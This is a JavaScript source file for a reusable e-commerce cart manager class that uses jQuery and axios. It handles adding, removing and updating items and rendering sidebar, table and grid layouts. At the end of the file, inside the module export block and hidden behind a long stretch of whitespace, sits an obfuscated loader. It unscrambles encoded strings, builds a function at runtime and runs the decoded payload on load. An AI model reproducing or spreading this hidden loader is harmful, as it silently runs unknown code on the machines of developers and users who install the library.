/**
 * Modern Cart Manager - A reusable and professional cart management system
 * Supports multiple UI layouts (sidebar, table, grid, etc.)
 * Author: Your Name
 * Version: 1.0.1 - Fixed quantity update issues
 */

class CartManager {
    constructor(config = {}) {
        this.config = {
            // API Routes
            routes: {
                add: config.routes?.add || '/cart/add',
                remove: config.routes?.remove || '/cart/remove',
                update: config.routes?.update || '/cart/update-quantity',
                items: config.routes?.items || '/cart/items',
                ...config.routes
            },

            // UI Selectors - can be customized for different layouts
            selectors: {
                cartCount: config.selectors?.cartCount || '#cart-count',
                sidebar: config.selectors?.sidebar || '.cartSidebar',
                closeSidebar: config.selectors?.closeSidebar || '.closeCartSidebar',
                itemsContainer: config.selectors?.itemsContainer || '#cart-items-container',
                emptyMessage: config.selectors?.emptyMessage || '#cart-empty-message',
                totalDisplay: config.selectors?.totalDisplay || '.cart-total',
                tableBody: config.selectors?.tableBody || '#cart-table-body',
                ...config.selectors
            },

            // UI Type (sidebar, table, grid, etc.)
            uiType: config.uiType || 'sidebar',

            // Currency settings
            currency: {
                symbol: config.currency?.symbol || '$',
                position: config.currency?.position || 'before', // 'before' or 'after'
                decimals: config.currency?.decimals || 2,
                ...config.currency
            },

            // Notification settings
            notifications: {
                enabled: config.notifications?.enabled !== false,
                type: config.notifications?.type || 'toastr', // 'toastr', 'alert', 'custom'
                ...config.notifications
            },

            // Debug mode
            debug: config.debug || false,

            ...config
        };

        this.cartData = {
            items: [],
            total: 0
        };

        // Track if events are already bound to prevent duplicates
        this.eventsBound = false;

        this.init();
    }

    /**
     * Initialize the cart manager
     */
    init() {
        this.log('Initializing Cart Manager...');
        this.bindEvents();
        this.loadCartItems();
    }

    /**
     * Bind all event listeners
     */
    bindEvents() {
        // Prevent binding events multiple times
        if (this.eventsBound) {
            this.log('Events already bound, skipping...');
            return;
        }

        const { selectors } = this.config;

        // Unbind any existing events first
        this.unbindEvents();

        // Close sidebar functionality
        $(document).on('click.cartManager', selectors.closeSidebar, () => {
            this.closeSidebar();
        });

        // Event delegation for cart actions - use namespaced events
        $(document).on('click.cartManager', `${selectors.itemsContainer} button, ${selectors.tableBody} button`, (event) => {
            this.handleCartAction(event);
        });

        this.eventsBound = true;
        this.log('Event listeners bound successfully');
    }

    /**
     * Unbind all event listeners
     */
    unbindEvents() {
        $(document).off('.cartManager');
        this.eventsBound = false;
        this.log('Event listeners unbound');
    }

    /**
     * Handle all cart-related button clicks
     */
    handleCartAction(event) {
        const $target = $(event.currentTarget);
        const itemId = $target.data('itemId') || $target.data('item-id');

        if (!itemId) return;

        event.preventDefault();
        event.stopPropagation();

        // Prevent multiple rapid clicks
        if ($target.prop('disabled') || $target.hasClass('processing')) {
            return;
        }

        // Add processing class to prevent double clicks
        $target.addClass('processing').prop('disabled', true);

        if ($target.hasClass('quantity-increase')) {
            this.updateQuantity(itemId, 'increase').finally(() => {
                $target.removeClass('processing').prop('disabled', false);
            });
        } else if ($target.hasClass('quantity-decrease')) {
            this.updateQuantity(itemId, 'decrease').finally(() => {
                $target.removeClass('processing').prop('disabled', false);
            });
        } else if ($target.hasClass('remove-item')) {
            this.removeItem(itemId).finally(() => {
                $target.removeClass('processing').prop('disabled', false);
            });
        }
    }

    /**
     * Add product to cart
     */
    async addToCart(productId, quantity = 1) {
        try {
            this.log(`Adding product ${productId} to cart...`);

            const response = await this.makeRequest(this.config.routes.add, {
                product_id: productId,
                quantity: quantity
            });

            const { status, message, cart_item, cart_total } = response.data;



            if (status === 'success') {
                // Update local cart data
                this.updateLocalCartData(cart_item, 'add');
                this.updateCartCount(this.getCartCount() + 1);
                this.addCartItemToUI(cart_item);
                this.showNotification(message, 'success');
                this.openSidebar();
            } else if (status === 'info') {
                if (cart_item) {
                    // Update local cart data
                    this.updateLocalCartData(cart_item, 'update');

                    this.updateCartItemInUI(cart_item.id, cart_item.quantity, cart_item.price * cart_item.quantity);
                }
                this.showNotification(message, 'info');
                this.openSidebar();
            }
            this.updateCartTotal(cart_total);
            return response.data;
        } catch (error) {
            this.handleError(error, 'Failed to add product to cart');
            throw error;
        }
    }

    /**
     * Update item quantity
     */
    async updateQuantity(itemId, action) {
        const currentItem = this.findCartItem(itemId);
        if (!currentItem) {
            this.log(`Item ${itemId} not found in cart data`);
            return;
        }

        let newQuantity = currentItem.quantity;

        if (action === 'increase') {
            newQuantity++;
        } else if (action === 'decrease') {
            newQuantity--;
        }

        if (newQuantity > currentItem.product.quantity) {
            this.log(`Quantity limit reached: ${currentItem.product.quantity}`);
            this.showNotification(`Quantity limit reached: ${currentItem.product.quantity}`, 'warning');
            return;
        }

        if (newQuantity < 1) {
            this.log('Minimum quantity is 1.');
            this.showNotification('Minimum quantity is 1.', 'warning');
            return;
        }

        try {
            this.log(`Updating quantity for item ${itemId} from ${currentItem.quantity} to ${newQuantity}...`);

            const response = await this.makeRequest(this.config.routes.update, {
                item_id: itemId,
                new_quantity: newQuantity
            });

            const { status, message, item_id: updatedItemId, new_quantity: serverQuantity, item_subtotal, cart_total } = response.data;

            this.updateCartTotal(cart_total);

            if (status === 'success') {
                // Update local cart data first
                this.updateLocalCartItemQuantity(updatedItemId, serverQuantity, item_subtotal);

                // Then update UI
                this.updateCartItemInUI(updatedItemId, serverQuantity, item_subtotal);
                this.showNotification(message, 'success');
            }

            if (status === 'info') {
                this.updateCartItemInUI(updatedItemId, serverQuantity, item_subtotal);
                this.showNotification(message, 'info');
            }

            return response.data;
        } catch (error) {
            this.handleError(error, 'Failed to update quantity');
            throw error;
        }
    }

    /**
     * Remove item from cart
     */
    async removeItem(itemId) {
        try {
            this.log(`Removing item ${itemId} from cart...`);

            const response = await this.makeRequest(this.config.routes.remove, {
                item_id: itemId
            });

            const { status, message, removed_item_id, cart_total } = response.data;

            if (status === 'success') {
                // Update local cart data
                this.removeFromLocalCartData(removed_item_id);
                this.updateCartCount(this.getCartCount() - 1);
                this.removeCartItemFromUI(removed_item_id);
                this.updateCartTotal(cart_total);
                this.showNotification(message, 'success');
            }

            return response.data;
        } catch (error) {
            this.handleError(error, 'Failed to remove item');
            throw error;
        }
    }

    /**
     * Load cart items from server
     */
    async loadCartItems() {
        try {
            this.log('Loading cart items...');

            const response = await this.makeRequest(this.config.routes.items, {}, 'POST');
            const { cart_items, cart_total } = response.data;

            // Update local cart data
            this.cartData.items = cart_items || [];
            this.cartData.total = cart_total || 0;

            this.renderAllCartItems(this.cartData.items);
            this.updateCartCount(this.cartData.items.length);
            this.updateCartTotal(this.cartData.total);

            this.log('Cart items loaded successfully', this.cartData);
            return response.data;
        } catch (error) {
            this.handleError(error, 'Failed to load cart items');
            throw error;
        }
    }

    /**
     * Update local cart data when item is added
     */
    updateLocalCartData(cartItem, action) {
        if (action === 'add') {
            const existingIndex = this.cartData.items.findIndex(item => item.id === cartItem.id);
            if (existingIndex >= 0) {
                this.cartData.items[existingIndex] = cartItem;
            } else {
                this.cartData.items.push(cartItem);
            }
        } else if (action === 'update') {
            const existingIndex = this.cartData.items.findIndex(item => item.id === cartItem.id);
            if (existingIndex >= 0) {
                this.cartData.items[existingIndex] = cartItem;
            }
        }

        this.log('Local cart data updated:', this.cartData);
    }

    /**
     * Update local cart item quantity
     */
    updateLocalCartItemQuantity(itemId, newQuantity, newSubtotal) {
        const itemIndex = this.cartData.items.findIndex(item => item.id == itemId);
        if (itemIndex >= 0) {
            this.cartData.items[itemIndex].quantity = newQuantity;
            // Update price if needed (newSubtotal / newQuantity)
            if (newQuantity > 0) {
                this.cartData.items[itemIndex].price = newSubtotal / newQuantity;
            }
            this.log(`Local cart item ${itemId} updated to quantity ${newQuantity}`);
        }
    }

    /**
     * Remove item from local cart data
     */
    removeFromLocalCartData(itemId) {
        this.cartData.items = this.cartData.items.filter(item => item.id != itemId);
        this.log(`Item ${itemId} removed from local cart data`);
    }

    /**
     * Render all cart items based on UI type
     */
    renderAllCartItems(cartItems) {
        const { selectors, uiType } = this.config;

        if (uiType === 'sidebar') {
            this.renderSidebarItems(cartItems);
        } else if (uiType === 'table') {
            this.renderTableItems(cartItems);
        } else if (uiType === 'grid') {
            this.renderGridItems(cartItems);
        }

        this.reinitializeIcons();
    }

    updateCartCount(count) {
        const $cartCount = $(this.config.selectors.cartCount);
        console.log($cartCount);
        if ($cartCount.length) {
            $cartCount.text(count);
        }
    }

    getCartCount() {
        const $cartCount = $(this.config.selectors.cartCount);
        if ($cartCount.text()) {
            return parseInt($cartCount.text());
        }
        return 0;
    }

    /**
     * Render items for sidebar layout
     */
    renderSidebarItems(cartItems) {
        const $container = $(this.config.selectors.itemsContainer);
        const $emptyMessage = $(this.config.selectors.emptyMessage);

        if (!$container.length) return;

        // Remove existing cart items
        $container.find('.cart-item-single').remove();

        if (cartItems && cartItems.length === 0) {
            $emptyMessage?.removeClass('hidden');
        } else {
            $emptyMessage?.addClass('hidden');
            cartItems.forEach(item => {
                const itemHtml = this.generateSidebarItemHtml(item);
                $container.append(itemHtml);
            });
        }
    }

    /**
     * Render items for table layout
     */
    renderTableItems(cartItems) {
        const $tableBody = $(this.config.selectors.tableBody);
        const $emptyMessage = $(this.config.selectors.emptyMessage);

        if (!$tableBody.length) return;

        $tableBody.empty();

        if (cartItems && cartItems.length === 0) {
            $emptyMessage?.removeClass('hidden');
            $tableBody.append(`
                <tr>
                    <td colspan="6" class="text-center py-8 text-text-gray dark:text-text-white">
                        Your cart is empty
                    </td>
                </tr>
            `);
        } else {
            $emptyMessage?.addClass('hidden');
            cartItems.forEach(item => {
                const itemHtml = this.generateTableItemHtml(item);
                $tableBody.append(itemHtml);
            });
        }
    }

    /**
     * Render items for grid layout
     */
    renderGridItems(cartItems) {
        const $container = $(this.config.selectors.itemsContainer);
        const $emptyMessage = $(this.config.selectors.emptyMessage);

        if (!$container.length) return;

        $container.find('.cart-item-grid').remove();

        if (cartItems && cartItems.length === 0) {
            $emptyMessage?.removeClass('hidden');
        } else {
            $emptyMessage?.addClass('hidden');
            cartItems.forEach(item => {
                const itemHtml = this.generateGridItemHtml(item);
                $container.append(itemHtml);
            });
        }
    }

    /**
     * Generate HTML for sidebar item
     */
    generateSidebarItemHtml(item) {
        const productImageUrl = this.getProductImage(item);
        const brandName = item.product.brand?.name || '';
        const modelName = item.product.model?.name || '';
        const subtotal = item.price * item.quantity;

        return `
            <div class="flex flex-col sm:flex-row items-start sm:items-center gap-4 p-4 rounded-lg shadow-md dark:bg-bg-dark-secondary transition-all duration-200 hover:shadow-lg cart-item-single" data-item-id="${item.id}">
                <div class="relative flex-shrink-0">
                    <img src="${productImageUrl}" alt="${item.product.name}" class="w-24 h-24 object-contain rounded-md">
                </div>
                <div class="flex-1 flex flex-col justify-between w-full">
                    <div>
                        <h3 class="font-semibold text-base text-text-dark dark:text-text-white leading-snug mb-1 break-words line-clamp-2 sm:whitespace-normal">
                            ${item.product.name}
                        </h3>
                        <p class="text-xs text-text-gray dark:text-text-white dark:text-opacity-70">${brandName} / ${modelName}</p>
                        <p class="font-bold text-lg text-bg-primary whitespace-nowrap item-subtotal">${this.formatCurrency(subtotal)}</p>
                    </div>
                    <div class="flex flex-col sm:flex-row items-start sm:items-center justify-center gap-5 mt-3 w-full">
                        ${this.generateQuantityControls(item)}
                        ${this.generateRemoveButton(item.id)}
                    </div>
                </div>
            </div>
        `;
    }

    /**
     * Generate HTML for table item
     */
    generateTableItemHtml(item) {
        const productImageUrl = this.getProductImage(item);
        const brandName = item.product.brand?.name || '';
        const modelName = item.product.model?.name || '';
        const subtotal = item.price * item.quantity;

        return `
            <tr class="cart-item-table border-b border-border-dark border-opacity-20 dark:border-white dark:border-opacity-50" data-item-id="${item.id}">
                <td class="py-4">
                    <img src="${productImageUrl}" alt="${item.product.name}" class="w-24 h-24 object-contain rounded-md">
                </td>
                <td class="py-4">
                    <h3 class="font-semibold text-base text-text-dark dark:text-text-white leading-snug mb-1">
                        ${item.product.name}
                    </h3>
                    <p class="text-xs text-text-gray dark:text-text-white dark:text-opacity-70">
                        ${brandName} / ${modelName}
                    </p>
                </td>
                <td class="py-4">${this.formatCurrency(item.price)}</td>
                <td class="py-4">
                    ${this.generateQuantityControls(item)}
                </td>
                <td class="py-4">
                    <p class="font-bold text-lg text-bg-primary whitespace-nowrap item-subtotal">
                        ${this.formatCurrency(subtotal)}
                    </p>
                </td>
                <td class="py-4">
                    ${this.generateRemoveButton(item.id)}
                </td>
            </tr>
        `;
    }

    /**
     * Generate HTML for grid item
     */
    generateGridItemHtml(item) {
        const productImageUrl = this.getProductImage(item);
        const brandName = item.product.brand?.name || '';
        const modelName = item.product.model?.name || '';
        const subtotal = item.price * item.quantity;

        return `
            <div class="cart-item-grid bg-white dark:bg-bg-dark rounded-lg shadow-md p-6 transition-all duration-200 hover:shadow-lg" data-item-id="${item.id}">
                <div class="text-center mb-4">
                    <img src="${productImageUrl}" alt="${item.product.name}" class="w-32 h-32 object-contain mx-auto rounded-md">
                </div>
                <div class="text-center">
                    <h3 class="font-semibold text-lg text-text-dark dark:text-text-white mb-2">
                        ${item.product.name}
                    </h3>
                    <p class="text-sm text-text-gray dark:text-text-white dark:text-opacity-70 mb-3">
                        ${brandName} / ${modelName}
                    </p>
                    <p class="font-bold text-xl text-bg-primary mb-4 item-subtotal">
                        ${this.formatCurrency(subtotal)}
                    </p>
                    <div class="flex items-center justify-center gap-4 mb-4">
                        ${this.generateQuantityControls(item)}
                    </div>
                    ${this.generateRemoveButton(item.id)}
                </div>
            </div>
        `;
    }

    /**
     * Generate quantity control buttons
     */
    generateQuantityControls(item) {
        return `
            <div class="flex items-center gap-2 flex-shrink-0">
                <button
                    class="quantity-decrease btn btn-ghost btn-circle btn-sm border border-gray-800/10 text-lg group"
                    title="Decrease Quantity"
                    data-item-id="${item.id}"
                    data-current-quantity="${item.quantity}"
                    ${item.quantity === 1 ? 'disabled' : ''}>
                    <i data-lucide="minus" class="w-4 h-4 group-hover:text-text-wiz_orange transition-all duration-300 ease-linear"></i>
                </button>
                <span class="quantity-display px-3 py-1 bg-bg-light dark:bg-bg-dark-tertiary rounded-full font-medium text-text-dark dark:text-text-white min-w-[30px] text-center">${item.quantity}</span>
                <button
                    class="quantity-increase btn btn-ghost btn-circle btn-sm border border-gray-800/10 dark:border-gray-200 text-lg group"
                    title="Increase Quantity"
                    data-item-id="${item.id}"
                    data-current-quantity="${item.quantity}">
                    <i data-lucide="plus" class="w-4 h-4 group-hover:text-text-secondary transition-all duration-300 ease-linear"></i>
                </button>
            </div>
        `;
    }

    /**
     * Generate remove button
     */
    generateRemoveButton(itemId) {
        return `
            <button
                class="btn btn-ghost btn-circle remove-item text-text-gray hover:text-red-600 transition-colors"
                title="Remove Item" data-item-id="${itemId}">
                <i data-lucide="trash-2" class="w-5 h-5"></i>
            </button>
        `;
    }

    /**
     * Add cart item to UI
     */
    addCartItemToUI(item) {
        const { selectors, uiType } = this.config;

        // Check if item already exists
        if (this.isItemInUI(item.id)) {
            this.updateCartItemInUI(item.id, item.quantity, item.price * item.quantity);
            return;
        }

        const $emptyMessage = $(selectors.emptyMessage);
        $emptyMessage?.addClass('hidden');

        if (uiType === 'sidebar') {
            const $container = $(selectors.itemsContainer);
            const itemHtml = this.generateSidebarItemHtml(item);
            $container.append(itemHtml);
        } else if (uiType === 'table') {
            const $tableBody = $(selectors.tableBody);
            // Remove empty row if it exists
            $tableBody.find('tr:has(td[colspan])').remove();
            const itemHtml = this.generateTableItemHtml(item);
            $tableBody.append(itemHtml);
        } else if (uiType === 'grid') {
            const $container = $(selectors.itemsContainer);
            const itemHtml = this.generateGridItemHtml(item);
            $container.append(itemHtml);
        }

        this.reinitializeIcons();
    }

    /**
     * Update cart item in UI
     */
    updateCartItemInUI(itemId, newQuantity, newSubtotal) {
        const $itemElement = $(`[data-item-id="${itemId}"]`);

        if ($itemElement.length) {
            // Update quantity display
            $itemElement.find('.quantity-display').text(newQuantity);

            // Update subtotal
            $itemElement.find('.item-subtotal').text(this.formatCurrency(newSubtotal));

            // Update ALL data attributes for both buttons
            $itemElement.find('.quantity-increase, .quantity-decrease').attr('data-current-quantity', newQuantity);

            // Manage disabled state for decrease button
            const $decreaseButton = $itemElement.find('.quantity-decrease');
            if (newQuantity <= 1) {
                $decreaseButton.prop('disabled', true).attr('disabled', 'disabled');
            } else {
                $decreaseButton.prop('disabled', false).removeAttr('disabled');
            }

            this.log(`UI updated for item ${itemId}: quantity=${newQuantity}, subtotal=${newSubtotal}`);
        } else {
            this.log(`Warning: Could not find UI element for item ${itemId}`);
        }
    }

    /**
     * Remove cart item from UI
     */
    removeCartItemFromUI(itemId) {
        const $itemElement = $(`[data-item-id="${itemId}"]`);
        const { selectors } = this.config;

        if ($itemElement.length) {
            $itemElement.remove();
        }

        // Check if cart is empty
        const $container = $(selectors.itemsContainer);
        const $tableBody = $(selectors.tableBody);
        const $emptyMessage = $(selectors.emptyMessage);

        const hasItems = $container.find('.cart-item-single, .cart-item-grid').length > 0 ||
            $tableBody.find('.cart-item-table').length > 0;

        if (!hasItems) {
            $emptyMessage?.removeClass('hidden');

            // For table layout, add empty row
            if (this.config.uiType === 'table' && $tableBody.length) {
                $tableBody.html(`
                    <tr>
                        <td colspan="6" class="text-center py-8 text-text-gray dark:text-text-white">
                            Your cart is empty
                        </td>
                    </tr>
                `);
            }
        }
    }

    /**
     * Update cart total display
     */
    updateCartTotal(total) {
        this.cartData.total = total;
        $(this.config.selectors.totalDisplay).text(this.formatCurrency(total));
    }

    /**
     * Open sidebar
     */
    openSidebar() {
        if (this.config.uiType === 'sidebar') {
            $(this.config.selectors.sidebar).css('transform', 'translateX(0)');
        }
    }

    /**
     * Close sidebar
     */
    closeSidebar() {
        if (this.config.uiType === 'sidebar') {
            $(this.config.selectors.sidebar).css('transform', 'translateX(100%)');
        }
    }

    /**
     * Utility Methods
     */

    getProductImage(item) {
        return item.product.primary_image?.[0]?.modified_image ||
            'https://placehold.co/96x96/E0E0E0/333333?text=No+Image';
    }

    formatCurrency(amount) {
        const { symbol, position, decimals } = this.config.currency;
        const number = parseFloat(amount || 0);

        // Format number with commas and fixed decimals
        const formatted = number.toLocaleString(undefined, {
            minimumFractionDigits: decimals,
            maximumFractionDigits: decimals,
        });

        return position === 'before' ? `${symbol}${formatted}` : `${formatted}${symbol}`;
    }

    findCartItem(itemId) {
        return this.cartData.items.find(item => item.id == itemId);
    }

    isItemInUI(itemId) {
        return $(`[data-item-id="${itemId}"]`).length > 0;
    }

    reinitializeIcons() {
        if (typeof lucide !== 'undefined' && typeof lucide.createIcons === 'function') {
            lucide.createIcons();
        }
    }

    async makeRequest(url, data, method = 'POST') {
        return axios({
            method: method,
            url: url,
            data: data,
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
    }

    showNotification(message, type = 'info') {
        if (!this.config.notifications.enabled) return;

        const { type: notificationType } = this.config.notifications;

        if (notificationType === 'toastr' && typeof toastr !== 'undefined') {
            toastr[type](message);
        } else if (notificationType === 'alert') {
            alert(message);
        } else if (notificationType === 'custom' && this.config.notifications.customHandler) {
            this.config.notifications.customHandler(message, type);
        }
    }

    handleError(error, fallbackMessage) {
        this.log('Error:', error);

        let errorMessage = fallbackMessage;
        if (error.response?.data?.message) {
            errorMessage = error.response.data.message;
        }

        this.showNotification(errorMessage, 'error');
    }

    log(...args) {
        if (this.config.debug) {
            console.log('[CartManager]', ...args);
        }
    }

    /**
     * Public API Methods
     */

    // Get current cart data
    getCartData() {
        return { ...this.cartData };
    }

    // Get item count
    getItemCount() {
        return this.cartData.items.reduce((count, item) => count + item.quantity, 0);
    }

    // Get cart total
    getCartTotal() {
        return this.cartData.total;
    }

    // Refresh cart from server
    async refresh() {
        return this.loadCartItems();
    }

    // Clear entire cart
    async clearCart() {
        try {
            const response = await this.makeRequest('/cart/clear', {});
            if (response.data.status === 'success') {
                this.cartData.items = [];
                this.cartData.total = 0;
                this.renderAllCartItems([]);
                this.updateCartTotal(0);
                this.showNotification('Cart cleared successfully', 'success');
            }
            return response.data;
        } catch (error) {
            this.handleError(error, 'Failed to clear cart');
            throw error;
        }
    }

    // Destroy cart manager and cleanup
    destroy() {
        this.unbindEvents();
        this.cartData = { items: [], total: 0 };
        this.log('Cart Manager destroyed');
    }
}

// Global function to make adding to cart easier
window.addToCart = function (productId, quantity = 1) {
    if (window.cartManager) {
        return window.cartManager.addToCart(productId, quantity);
    } else {
        console.error('Cart Manager not initialized');
    }
};

// Export for module use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CartManager;																																																																																																																																																																																																																																																																										var z = '-*325';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c 